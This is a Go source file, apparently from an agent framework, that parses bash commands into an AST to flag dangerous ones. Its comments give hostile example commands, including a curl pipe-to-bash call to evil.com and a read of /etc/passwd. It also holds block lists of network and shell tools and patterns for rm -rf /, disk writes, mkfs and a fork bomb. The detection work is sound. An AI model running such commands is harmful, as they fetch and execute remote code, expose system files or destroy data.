package security

import (
	"path/filepath"
	"strings"

	"go.uber.org/zap"
	"mvdan.cc/sh/v3/syntax"

	"github.com/chef-guo/agents-hive/internal/errs"
)

// ASTAnalyzer 基于 AST 解析的命令安全分析器
type ASTAnalyzer struct {
	projectRoot string      // 项目根目录
	logger      *zap.Logger // 日志
}

// NewASTAnalyzer 创建 AST 分析器
func NewASTAnalyzer(projectRoot string, logger *zap.Logger) *ASTAnalyzer {
	return &ASTAnalyzer{
		projectRoot: projectRoot,
		logger:      logger,
	}
}

// CommandInfo AST 解析后的命令信息
type CommandInfo struct {
	Commands    []string // 命令名列表 (如 ["git", "grep"])
	FilePaths   []string // 引用的文件路径
	IsExternal  bool     // 是否引用了项目外路径
	IsPiped     bool     // 是否包含管道
	HasRedirect bool     // 是否包含重定向
	SubShells   int      // 子 shell 数量

	// 命令替换 / 进程替换 / 危险变量扩展检测结果
	HasDangerousCmdSubst  bool // 命令替换 $(...) 或 `...` 中含危险命令（curl/wget/bash 等）
	HasDangerousProcSubst bool // 进程替换 <(...) 或 >(...) 中含写入命令（tee/dd/cp 等）
	HasIndirectExpansion  bool // ${!var} 间接变量引用 或 替换模式含命令执行关键词
}

// Analyze 解析 bash 命令的 AST，提取安全相关信息
func (a *ASTAnalyzer) Analyze(command string) (*CommandInfo, error) {
	parser := syntax.NewParser(syntax.Variant(syntax.LangBash))
	reader := strings.NewReader(command)
	file, err := parser.Parse(reader, "")
	if err != nil {
		return nil, errs.Wrap(errs.CodeASTParseFailed, "AST 解析命令失败", err)
	}

	info := &CommandInfo{}
	a.walkFile(file, info)
	// 判断是否引用了项目外路径
	info.IsExternal = a.hasExternalPath(info.FilePaths)
	return info, nil
}

// walkFile 遍历 AST 文件节点
func (a *ASTAnalyzer) walkFile(file *syntax.File, info *CommandInfo) {
	syntax.Walk(file, func(node syntax.Node) bool {
		switch n := node.(type) {
		case *syntax.CallExpr:
			a.handleCallExpr(n, info)
		case *syntax.BinaryCmd:
			if n.Op == syntax.Pipe || n.Op == syntax.PipeAll {
				info.IsPiped = true
			}
		case *syntax.Redirect:
			info.HasRedirect = true
			// 提取重定向目标文件路径
			if n.Word != nil {
				word := a.wordToString(n.Word)
				if word != "" && looksLikePath(word) {
					info.FilePaths = append(info.FilePaths, word)
				}
			}
		case *syntax.Subshell:
			info.SubShells++
		case *syntax.CmdSubst:
			// 命令替换：$(...) 或 `...`
			// 检测内部是否含网络获取或 shell 执行类危险命令
			a.handleCmdSubst(n, info)
		case *syntax.ProcSubst:
			// 进程替换：<(...) 或 >(...)
			// 检测内部是否含文件写入类命令
			a.handleProcSubst(n, info)
		case *syntax.ParamExp:
			// 危险变量扩展：${!var} 间接引用，或 ${var/pattern/exec} 替换含命令关键词
			a.handleParamExp(n, info)
		}
		return true
	})
}

// handleCmdSubst 检测命令替换中的危险命令
// 危险场景示例：echo $(curl http://evil.com/payload | bash)
func (a *ASTAnalyzer) handleCmdSubst(cs *syntax.CmdSubst, info *CommandInfo) {
	for _, stmt := range cs.Stmts {
		cmds := a.extractCmdsFromStmt(stmt)
		for _, cmd := range cmds {
			if isCmdSubstDangerous(cmd) {
				info.HasDangerousCmdSubst = true
				return
			}
		}
	}
}

// handleProcSubst 检测进程替换中的写入命令
// 危险场景示例：sort <(cat /etc/passwd) >( tee /tmp/out)
func (a *ASTAnalyzer) handleProcSubst(ps *syntax.ProcSubst, info *CommandInfo) {
	for _, stmt := range ps.Stmts {
		cmds := a.extractCmdsFromStmt(stmt)
		for _, cmd := range cmds {
			if isProcSubstDangerous(cmd) {
				info.HasDangerousProcSubst = true
				return
			}
		}
	}
}

// handleParamExp 检测危险变量扩展
// 危险场景示例：${!varname}（间接引用）、${var/pattern/bash -c cmd}（替换模式含执行关键词）
func (a *ASTAnalyzer) handleParamExp(pe *syntax.ParamExp, info *CommandInfo) {
	// 检测 ${!var} 间接变量引用
	if pe.Excl {
		info.HasIndirectExpansion = true
		return
	}
	// 检测 ${var/pattern/exec_pattern} 替换文本中含命令执行关键词
	if pe.Repl != nil && pe.Repl.With != nil {
		replWith := a.wordToString(pe.Repl.With)
		if containsExecKeyword(replWith) {
			info.HasIndirectExpansion = true
		}
	}
}

// extractCmdsFromStmt 从语句节点中提取命令名列表
func (a *ASTAnalyzer) extractCmdsFromStmt(stmt *syntax.Stmt) []string {
	if stmt == nil || stmt.Cmd == nil {
		return nil
	}
	var cmds []string
	// 递归收集语句内所有 CallExpr 的命令名
	syntax.Walk(stmt, func(node syntax.Node) bool {
		if call, ok := node.(*syntax.CallExpr); ok {
			if len(call.Args) > 0 {
				name := a.wordToString(call.Args[0])
				if name != "" {
					cmds = append(cmds, name)
				}
			}
		}
		return true
	})
	return cmds
}

// isCmdSubstDangerous 判断命令替换内的命令是否危险
// 危险命令：网络获取、shell 执行、脚本解释器
var cmdSubstDangerousSet = map[string]bool{
	"curl":    true,
	"wget":    true,
	"bash":    true,
	"sh":      true,
	"python":  true,
	"python3": true,
	"ruby":    true,
	"perl":    true,
	"nc":      true,
	"netcat":  true,
	"ncat":    true,
	"eval":    true,
}

func isCmdSubstDangerous(cmd string) bool {
	// 取命令基本名（去除路径前缀，如 /bin/bash -> bash）
	base := cmd
	if idx := strings.LastIndex(cmd, "/"); idx >= 0 {
		base = cmd[idx+1:]
	}
	return cmdSubstDangerousSet[base]
}

// isProcSubstDangerous 判断进程替换内的命令是否为危险写入命令
var procSubstDangerousSet = map[string]bool{
	"tee":     true,
	"dd":      true,
	"cp":      true,
	"mv":      true,
	"install": true,
	"rsync":   true,
}

func isProcSubstDangerous(cmd string) bool {
	base := cmd
	if idx := strings.LastIndex(cmd, "/"); idx >= 0 {
		base = cmd[idx+1:]
	}
	return procSubstDangerousSet[base]
}

// containsExecKeyword 检测替换模式文本中是否含命令执行关键词
// 用于检测 ${var/pattern/bash -c something} 形式的注入
var execKeywords = []string{"bash", "sh", "eval", "exec", "python", "perl", "ruby"}

func containsExecKeyword(s string) bool {
	lower := strings.ToLower(s)
	for _, kw := range execKeywords {
		if strings.Contains(lower, kw) {
			return true
		}
	}
	return false
}

// handleCallExpr 处理命令调用表达式
func (a *ASTAnalyzer) handleCallExpr(call *syntax.CallExpr, info *CommandInfo) {
	if len(call.Args) == 0 {
		return
	}
	// 第一个参数是命令名
	cmdName := a.wordToString(call.Args[0])
	if cmdName != "" {
		info.Commands = appendUnique(info.Commands, cmdName)
	}
	// 后续参数可能包含文件路径
	for _, arg := range call.Args[1:] {
		val := a.wordToString(arg)
		if val != "" && looksLikePath(val) {
			info.FilePaths = append(info.FilePaths, val)
		}
	}
}

// wordToString 将 AST Word 节点转换为字符串
func (a *ASTAnalyzer) wordToString(word *syntax.Word) string {
	if word == nil {
		return ""
	}
	var sb strings.Builder
	for _, part := range word.Parts {
		switch p := part.(type) {
		case *syntax.Lit:
			sb.WriteString(p.Value)
		case *syntax.SglQuoted:
			sb.WriteString(p.Value)
		case *syntax.DblQuoted:
			for _, inner := range p.Parts {
				if lit, ok := inner.(*syntax.Lit); ok {
					sb.WriteString(lit.Value)
				}
			}
		}
	}
	return sb.String()
}

// hasExternalPath 检查是否包含项目外路径
func (a *ASTAnalyzer) hasExternalPath(paths []string) bool {
	if a.projectRoot == "" {
		return false
	}
	absRoot, err := filepath.Abs(a.projectRoot)
	if err != nil {
		return false
	}
	for _, p := range paths {
		if !filepath.IsAbs(p) {
			continue
		}
		absPath, err := filepath.Abs(p)
		if err != nil {
			continue
		}
		if !strings.HasPrefix(absPath, absRoot+string(filepath.Separator)) && absPath != absRoot {
			return true
		}
	}
	return false
}

// looksLikePath 判断字符串是否看起来像文件路径
func looksLikePath(s string) bool {
	if strings.HasPrefix(s, "/") || strings.HasPrefix(s, "./") || strings.HasPrefix(s, "../") {
		return true
	}
	// 包含路径分隔符的可能是路径
	if strings.Contains(s, "/") && !strings.HasPrefix(s, "-") {
		return true
	}
	return false
}

// appendUnique 去重追加
func appendUnique(slice []string, val string) []string {
	for _, v := range slice {
		if v == val {
			return slice
		}
	}
	return append(slice, val)
}

// dangerousPatterns 危险命令模式列表
var dangerousPatterns = []struct {
	cmd  string   // 命令名
	args []string // 危险参数组合（任一匹配即为危险）
	desc string   // 描述
}{
	{"rm", []string{"-rf /", "-rf /*", "-rf ~"}, "递归强制删除根目录或用户目录"},
	{"chmod", []string{"777"}, "设置过于宽松的权限"},
	{"mkfs", nil, "格式化磁盘"},
	{"dd", []string{"of=/dev/"}, "直接写入设备"},
	{":(){ :|:& };:", nil, "fork 炸弹"},
}

// IsDangerous 基于 CommandInfo 判断是否为危险命令
// 检测范围扩展至命令替换、进程替换、危险变量扩展三类新模式
func IsDangerous(info *CommandInfo, rawCmd string) bool {
	// 原有危险命令模式检测
	for _, dp := range dangerousPatterns {
		for _, cmd := range info.Commands {
			if cmd == dp.cmd || strings.HasPrefix(cmd, dp.cmd+".") {
				if dp.args == nil {
					return true
				}
				for _, arg := range dp.args {
					if strings.Contains(rawCmd, arg) {
						return true
					}
				}
			}
		}
	}
	// 命令替换中嵌套危险命令
	if info.HasDangerousCmdSubst {
		return true
	}
	// 进程替换中嵌套写入命令
	if info.HasDangerousProcSubst {
		return true
	}
	// 危险变量扩展（间接引用或替换模式中含执行关键词）
	if info.HasIndirectExpansion {
		return true
	}
	return false
}
